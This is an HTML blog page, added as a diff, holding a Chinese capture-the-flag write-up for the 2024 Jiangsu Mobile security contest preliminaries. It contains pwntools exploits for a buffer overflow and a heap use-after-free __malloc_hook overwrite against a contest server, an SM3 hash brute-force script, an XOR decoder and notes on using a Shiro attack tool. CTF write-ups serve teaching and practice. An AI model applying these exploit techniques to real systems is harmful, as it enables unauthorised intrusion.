@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="viol1t">
+
+
+
+
+
+<title>2024年江苏移动网络安全竞赛初赛wp | viol1t</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2024年江苏移动网络安全竞赛初赛wp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 16, 2024&nbsp;&nbsp;18:24:11</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/WP/">WP</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>gets 溢出到 s1 改成 admin</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26870</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">r.sendline(p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h3><p>free处有uaf，打__malloc__fook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;221.178.230.105&#x27;</span>, <span class="number">36682</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;data&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;data&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = get_libc() - <span class="number">0x3c4b78</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.23-11/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">ogg = one[<span class="number">3</span>] + libc_base</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(ogg))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;size&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="easy-sm"><a href="#easy-sm" class="headerlink" title="easy-sm"></a>easy-sm</h3><p>直接爆破直到找到为止</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标哈希值</span></span><br><span class="line">hash_to_match = <span class="string">&quot;f1127f0189ad9e1bde949fb14991db82c9c9b41e90edcf014898595e8ab908c0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置尝试的最大次数</span></span><br><span class="line">max_attempts = <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来生成密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_password</span>(<span class="params">base, attempt</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;base&#125;</span><span class="subst">&#123;attempt:06d&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来计算SM3哈希值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_sm3_hash</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> sm3.sm3_hash(func.bytes_to_list(data.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始尝试寻找匹配的密码</span></span><br><span class="line"><span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(max_attempts):</span><br><span class="line">    <span class="comment"># 生成密码</span></span><br><span class="line">    password = generate_password(<span class="string">&quot;admin&quot;</span>, attempt)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算哈希值</span></span><br><span class="line">    hash_value = compute_sm3_hash(password)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查哈希值是否匹配</span></span><br><span class="line">    <span class="keyword">if</span> hash_value == hash_to_match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;匹配的密码已找到: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p>流量分析工具一把梭</p>
+<img src="/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1.png" class>
+
+<h3 id="bft"><a href="#bft" class="headerlink" title="bft"></a>bft</h3><p>使用bftools工具从图片中解brainfuck之后Brainfuck解密再base64解码</p>
+<img src="/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/2.png" class>
+
+<img src="/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/3.png" class>
+
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h3><p>ida打开就有flag</p>
+<img src="/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/4.png" class>
+
+<h3 id="HappySunday"><a href="#HappySunday" class="headerlink" title="HappySunday"></a>HappySunday</h3><p>存在异或加密，base64换表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">res = [<span class="number">0x7A</span>, <span class="number">0x36</span>, <span class="number">0x17</span>, <span class="number">0x3A</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x17</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x31</span>,</span><br><span class="line"><span class="number">0x2</span>, <span class="number">0x2D</span>, <span class="number">0x2</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x35</span>, <span class="number">0x3D</span>, <span class="number">0x4D</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x49</span>, <span class="number">0x2E</span>, <span class="number">0x0D</span>,</span><br><span class="line"><span class="number">0x2A</span>, <span class="number">0x3C</span>, <span class="number">0x2A</span>, <span class="number">0x4D</span>, <span class="number">0x2D</span>, <span class="number">0x2</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">	i = i ^ <span class="number">0x78</span></span><br><span class="line">	flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p>得到base64字符串再解base64</p>
+<img src="/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/5.png" class>
+
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><p>shiro工具一把梭</p>
+<img src="/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/6.png" class>
+
+<img src="/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/7.png" class>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>viol1t</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://viol1t.com/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/">https://viol1t.com/2024/11/16/2024%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/web/"># web</a>
+                    
+                        <a href="/tags/crypto/"># crypto</a>
+                    
+                        <a href="/tags/misc/"># misc</a>
+                    
+                        <a href="/tags/reverse/"># reverse</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/12/15/2024%E5%B9%B4CISCN-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/">2024年CISCN&长城杯初赛wp</a>
+            
+            
+            <a class="next" rel="next" href="/2024/11/09/2024%E5%B9%B4%E9%B9%8F%E5%9F%8E%E6%9D%AFwp/">2024年鹏城杯初赛wp</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
